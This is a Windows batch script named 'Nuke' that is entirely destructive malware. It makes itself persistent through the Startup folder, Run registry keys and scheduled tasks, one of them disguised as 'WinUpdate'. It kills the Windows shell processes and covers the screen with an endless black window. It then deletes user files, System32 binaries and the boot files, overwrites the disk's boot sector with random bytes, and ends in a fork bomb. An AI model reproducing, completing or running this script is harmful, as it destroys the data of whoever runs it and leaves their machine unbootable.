@echo off
setlocal EnableDelayedExpansion
title Nuke
if "%~1"=="bg" goto :bg
set "S=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "R1=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "R2=HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
set "PERSIST=0"
if exist "%S%" (
    copy /y "%~f0" "%S%\nuke.bat" >nul 2>&1
    if exist "%S%\nuke.bat" set "PERSIST=1"
)
copy /y "%~f0" "%TEMP%\nuke.bat" >nul 2>&1
if exist "%TEMP%\nuke.bat" set "PERSIST=1"
copy /y "%~f0" "C:\Windows\Temp\nuke.bat" >nul 2>&1
if exist "C:\Windows\Temp\nuke.bat" set "PERSIST=1"
copy /y "%~f0" "C:\Users\Public\nuke.bat" >nul 2>&1
if exist "C:\Users\Public\nuke.bat" set "PERSIST=1"
reg add "%R1%" /v Nuke /t REG_SZ /d "%S%\nuke.bat" /f >nul 2>&1
if !errorlevel! == 0 set "PERSIST=1"
reg add "%R2%" /v Nuke /t REG_SZ /d "%S%\nuke.bat" /f >nul 2>&1
if !errorlevel! == 0 set "PERSIST=1"
reg add "%R1%" /v WinUpdate /t REG_SZ /d "%TEMP%\nuke.bat" /f >nul 2>&1
if !errorlevel! == 0 set "PERSIST=1"
schtasks /create /tn "Nuke" /tr "%S%\nuke.bat" /sc onlogon /rl highest /f >nul 2>&1
if !errorlevel! == 0 set "PERSIST=1"
schtasks /create /tn "WinUpdate" /tr "%TEMP%\nuke.bat" /sc onstart /rl highest /f >nul 2>&1
if !errorlevel! == 0 set "PERSIST=1"
if "!PERSIST!"=="0" (
    goto :wiper
)
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im dwm.exe >nul 2>&1
taskkill /f /im sihost.exe >nul 2>&1
taskkill /f /im taskhost.exe >nul 2>&1
taskkill /f /im taskhostw.exe >nul 2>&1
start "" /min powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){ $f = New-Object System.Windows.Forms.Form; $f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.TopMost=$true; $f.BackColor='Black'; $f.ShowInTaskbar=$false; $f.Cursor=[System.Windows.Forms.Cursors]::None; $f.Show(); Start-Sleep -Milliseconds 100 }"
for /L %%i in (1,1,100) do start "" /min cmd /c "%~f0" bg
exit
:wiper
set "WIPED=0"
del /f /s /q "%USERPROFILE%\Desktop\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "%USERPROFILE%\Documents\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "%USERPROFILE%\Downloads\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "%USERPROFILE%\Pictures\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "%USERPROFILE%\Videos\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "%USERPROFILE%\Music\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "%USERPROFILE%\Favorites\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "%USERPROFILE%\Contacts\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\Users\Public\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\Temp\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "%TEMP%\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\Windows\System32\*.dll" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\Windows\System32\*.exe" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\Windows\SysWOW64\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\Windows\Fonts\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\boot\*" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\bootmgr" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\ntldr" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
del /f /s /q "C:\NTDETECT.COM" >nul 2>&1
if !errorlevel! == 0 set "WIPED=1"
if exist "%USERPROFILE%\Desktop" (
    dir /b "%USERPROFILE%\Desktop" >nul 2>&1
    if !errorlevel! == 0 set "WIPED=1"
)

if "!WIPED!"=="0" (
    goto :forkbomb
)

powershell -WindowStyle Hidden -Command "try { $fs = New-Object System.IO.FileStream '\\\\.\\PhysicalDrive0', 'Open', 'Write'; $buf = New-Object byte[] 512; (New-Object Random).NextBytes($buf); $fs.Write($buf, 0, 512); $fs.Flush(); $fs.Close() } catch {}" >nul 2>&1
goto :forkbomb
:forkbomb
:loop
%0|%0
%0|%0
%0|%0
%0|%0
%0|%0
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
ping -n 1 -w 1 127.0.0.1 >nul
goto loop
:bg
goto :wiper
